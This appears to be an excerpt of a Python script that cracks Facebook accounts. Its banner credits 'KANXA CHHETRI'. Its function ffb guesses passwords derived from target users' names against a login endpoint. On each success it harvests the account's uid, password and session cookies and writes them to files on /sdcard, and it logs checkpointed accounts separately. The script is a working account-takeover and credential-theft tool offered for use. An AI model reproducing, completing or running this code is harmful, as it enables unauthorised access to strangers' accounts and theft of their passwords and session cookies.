...
try:
    ...
    print('\x1b[1;92m[√] PLEASE WAIT CHECKING KANXA CHHETRI UPDATE...')
...
\033[1;32m[•] CREATED BY  :   KANXA BEBE
\033[1;33m[•] STYLE       :   KANXA DUN HONI!!
\033[1;34m[•] WHAT APPS   :   +97798********
\033[1;32m[•] FACEBOOK    :   KANXA CHHETRI
\33[37;41m[•] VERSION     :   0.1
...
def pak():
                ...
                linex()
                input(' PRESS ENTER TO BACK ')
                #os.system('python KANXA.py')
#------
def ffb(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [KANXA-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [LEGEND-KANXA-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/KANXA-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/KANXA-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [KANXA-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KANXA-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
